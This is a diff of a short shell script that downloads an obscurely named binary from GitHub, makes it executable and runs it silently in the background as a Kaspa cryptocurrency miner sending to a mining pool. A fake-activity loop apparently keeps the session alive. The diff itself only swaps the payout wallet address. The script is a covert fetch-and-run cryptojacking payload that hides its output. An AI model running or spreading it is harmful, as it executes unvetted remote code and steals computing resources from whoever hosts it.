@@ -1,4 +1,4 @@
 wget https://github.com/aqshakuy/kasepak/raw/main/AkubapakMU
 chmod 700 AkubapakMU
-./AkubapakMU --algo KASPA --pool stratum+tcp://pool.eu.woolypooly.com:3112 --user 0x9dc2157e3ccf7a88268afb7def08a872667a6e29.aqsh --pass 123 --dns-over-http=2 208.67.222.222 --no-cl > /dev/null 2>&1 &
+./AkubapakMU --algo KASPA --pool stratum+tcp://pool.eu.woolypooly.com:3112 --user kaspa:qzeks2y5gtf2fn0k4dlzwemwszc4fkwx0xtrgnhn68x38ymnlxrj27uzhcqky.aing --pass 123 --dns-over-http=2 208.67.222.222 --no-cl > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
